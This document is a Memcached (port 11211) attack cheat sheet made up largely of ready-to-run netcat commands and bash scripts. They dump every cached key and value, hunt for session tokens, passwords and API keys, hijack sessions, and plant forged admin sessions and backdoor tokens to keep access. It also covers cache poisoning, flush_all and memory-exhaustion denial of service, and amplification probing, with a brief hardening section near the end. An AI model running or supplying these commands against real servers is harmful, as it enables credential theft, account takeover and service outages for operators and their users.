# MEMCACHED ENUMERATION (Port 11211)

## SERVICE OVERVIEW
```
Memcached is a distributed memory caching system
- Default port: 11211
- Stores key-value pairs in RAM
- No authentication by default (old versions)
- Often contains sensitive data (session tokens, credentials)
- Can be abused for DDoS amplification
- Plain text protocol
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p11211 <IP>                            # Service/Version detection
nc -nv <IP> 11211                                # Manual connection
telnet <IP> 11211                                # Alternative connection

# Get version
echo "version" | nc <IP> 11211
echo "stats" | nc <IP> 11211 | grep version
```

## BASIC ENUMERATION
```bash
# Check if Memcached is accessible
nc <IP> 11211
> version                                        # Get version
> stats                                          # Get statistics

# One-liner version check
echo "version" | nc -nv <IP> 11211

# One-liner stats
echo "stats" | nc -nv <IP> 11211
```

## MEMCACHED COMMANDS
```bash
# Connect to Memcached
nc <IP> 11211
telnet <IP> 11211

# Basic commands:
stats                                            # General statistics
stats items                                      # Item statistics
stats slabs                                      # Slab statistics
stats sizes                                      # Size statistics
version                                          # Server version
quit                                             # Disconnect

# Get all keys (via stats)
stats cachedump <slab_id> <limit>                # Dump keys from slab

# Get value
get <key>                                        # Retrieve value

# Set value
set <key> <flags> <exptime> <bytes>
<data>

# Delete value
delete <key>                                     # Remove key
```

## DUMP ALL KEYS
```bash
# Memcached doesn't have a "list all keys" command
# Need to use stats cachedump on each slab

# Script to dump all keys:
#!/bin/bash
echo "stats items" | nc <IP> 11211 | grep -oP "(?<=items:)\d+" | sort -u | while read slab; do
    echo "stats cachedump $slab 1000" | nc <IP> 11211
done

# Alternative with memcdump (if installed)
memcdump --servers=<IP>:11211

# Or with memcached-tool
memcached-tool <IP>:11211 dump
```

## EXTRACT SENSITIVE DATA
```bash
# Common keys that may contain sensitive data:
# - session_*
# - user_*
# - token_*
# - auth_*
# - password_*
# - api_key_*

# Search for specific patterns
echo "stats items" | nc <IP> 11211 | grep -oP "(?<=items:)\d+" | sort -u | while read slab; do
    echo "stats cachedump $slab 1000" | nc <IP> 11211 | grep -E "session|password|token|api"
done

# Get specific key
echo "get session_12345" | nc <IP> 11211
echo "get user_admin" | nc <IP> 11211
```

## NMAP SCRIPTS
```bash
# Memcached enumeration
nmap -p11211 --script memcached-info <IP>       # Get info

# Custom script
nmap -p11211 --script "memcached-*" <IP>
```

## AUTHENTICATION (SASL)
```bash
# Modern Memcached supports SASL authentication
# But often disabled or misconfigured

# Check if SASL is enabled
echo "stats" | nc <IP> 11211 | grep -i sasl

# SASL authentication (if enabled)
# Requires specific client library, not simple netcat
```

## INJECTION/MANIPULATION
```bash
# Inject malicious data into cache
nc <IP> 11211
set malicious_key 0 0 100
<malicious_payload>

# Overwrite existing key
set existing_key 0 0 50
<new_malicious_value>

# Delete keys (DoS)
delete important_key

# Flush all cache (DoS!)
flush_all                                        # Clears entire cache!
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/gather/memcached_extractor         # Extract keys/values
use auxiliary/scanner/memcached/memcached_amp    # Amplification check
use auxiliary/scanner/memcached/memcached_version # Version detection
set RHOSTS <IP>
set RPORT 11211
run
```

## DDOS AMPLIFICATION ABUSE
```bash
# Memcached can be abused for DDoS amplification
# Amplification factor can be 10,000x to 50,000x!

# Check for UDP amplification
echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u <IP> 11211

# NOTE: Only test this on systems you own!
# Abusing memcached for DDoS is illegal!

# Detect amplification potential
nmap -sU -p11211 --script memcached-info <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ No authentication                              # Default in old versions
☐ Listening on 0.0.0.0                          # Should be localhost/internal only
☐ UDP enabled                                    # DDoS amplification risk
☐ Exposed to internet                            # Should be firewalled
☐ Contains sensitive data unencrypted            # Session tokens, passwords
☐ No rate limiting                               # Abuse possible
☐ flush_all command enabled                      # DoS risk
☐ Old version without SASL                       # No auth support
```

## VULNERABILITY SCANNING
```bash
# Search for Memcached exploits
searchsploit memcached

# Known vulnerabilities:
# CVE-2016-8704: Server update remote code execution
# CVE-2016-8705: Server append/prepend remote code execution
# CVE-2016-8706: SASL authentication remote code execution
# CVE-2011-4971: Buffer overflow

nmap -p11211 --script vuln <IP>
```

## SESSION HIJACKING
```bash
# If application stores sessions in Memcached:

# 1. Dump all keys
memcdump --servers=<IP>:11211 | grep session

# 2. Get session data
echo "get session_abc123" | nc <IP> 11211

# 3. Use stolen session
# Copy session ID and use in browser/curl

# 4. Create malicious session
echo "set session_admin 0 3600 100" | nc <IP> 11211
<malicious_session_data>
```

## EXTRACT CREDENTIALS
```bash
# Look for cached credentials
# Common key patterns:
# - password_*
# - auth_*
# - credentials_*
# - api_key_*
# - token_*

# Search and extract
memcdump --servers=<IP>:11211 | while read key; do
    echo "Checking: $key"
    echo "get $key" | nc <IP> 11211
done | grep -iE "password|secret|api|token"
```

## DATA EXFILTRATION
```bash
# Automated data extraction script
#!/bin/bash
IP=$1
PORT=11211

echo "[+] Extracting data from $IP:$PORT"

# Get all slabs
slabs=$(echo "stats items" | nc $IP $PORT | grep -oP "(?<=items:)\d+" | sort -u)

for slab in $slabs; do
    echo "[*] Dumping slab: $slab"
    echo "stats cachedump $slab 10000" | nc $IP $PORT | grep "ITEM" | while read line; do
        key=$(echo $line | awk '{print $2}')
        echo "[+] Key: $key"
        echo "get $key" | nc $IP $PORT
        echo ""
    done
done
```

## QUICK WIN CHECKLIST
```
☐ Check if port 11211 is accessible
☐ Test for no authentication (default)
☐ Dump all keys with stats cachedump
☐ Search for session tokens
☐ Look for passwords/credentials
☐ Check for API keys
☐ Test flush_all command (DoS)
☐ Check if UDP enabled (amplification)
☐ Extract and analyze cached data
☐ Search for known vulnerabilities
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive Memcached scan
nmap -sV -sU -p11211 --script "memcached-*" -oA memcached_enum <IP>

# Quick key dump
echo "stats items" | nc <IP> 11211

# Extract all data
for slab in $(echo "stats items" | nc <IP> 11211 | grep -oP "(?<=items:)\d+" | sort -u); do echo "stats cachedump $slab 1000" | nc <IP> 11211; done
```

## POST-EXPLOITATION (After Access)
```bash
# 1. Extract all data
memcdump --servers=<IP>:11211 > keys.txt
cat keys.txt | while read key; do
    echo "=== $key ===" >> dump.txt
    echo "get $key" | nc <IP> 11211 >> dump.txt
done

# 2. Analyze for sensitive data
grep -iE "password|secret|token|api|session|credential" dump.txt

# 3. Session hijacking
# Use extracted session tokens in browser

# 4. Credential reuse
# Test extracted passwords on other services

# 5. Maintain access
# Inject backdoor session tokens

# 6. DoS if needed
echo "flush_all" | nc <IP> 11211                 # Clear entire cache (use carefully!)
```

## MITIGATION & DETECTION
```bash
# Secure Memcached configuration:

# 1. Bind to localhost only
# Edit memcached config:
-l 127.0.0.1                                     # Listen on localhost only

# 2. Disable UDP
-U 0                                             # Disable UDP

# 3. Enable SASL authentication
-S                                               # Enable SASL

# 4. Firewall rules
iptables -A INPUT -p tcp --dport 11211 -s <trusted_IP> -j ACCEPT
iptables -A INPUT -p tcp --dport 11211 -j DROP

# 5. Use TLS/SSL (if supported)
# Requires Memcached 1.5.13+

# 6. Monitor access
netstat -an | grep 11211
ss -tan | grep 11211

# 7. Check for exposure
shodan search "port:11211"                       # Your server shouldn't appear!
```

## ADVANCED TECHNIQUES
```bash
# Cache poisoning
# Inject malicious data that application will use:
set user_admin 0 3600 200
{"username":"admin","role":"administrator","isAdmin":true}

# Race condition exploitation
# Rapidly set/get same key to cause inconsistencies

# Memory exhaustion
# Fill cache with junk data:
for i in {1..10000}; do
    echo "set junk_$i 0 0 1000000" | nc <IP> 11211
    head -c 1000000 /dev/urandom | nc <IP> 11211
done
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. No authentication by default (old versions)
2. Sensitive data cached in plain text
3. Session tokens accessible
4. Credentials may be cached
5. DDoS amplification (51,000x factor!)
6. flush_all = complete DoS
7. Cache poisoning possible
8. Often exposed to internet
9. No encryption

RECOMMENDATION:
- Bind to localhost or internal network only
- Disable UDP to prevent amplification attacks
- Enable SASL authentication
- Use TLS if possible
- Firewall port 11211
- Don't cache sensitive data
- Encrypt cached data at application level
- Monitor for unauthorized access
- Update to latest version
```
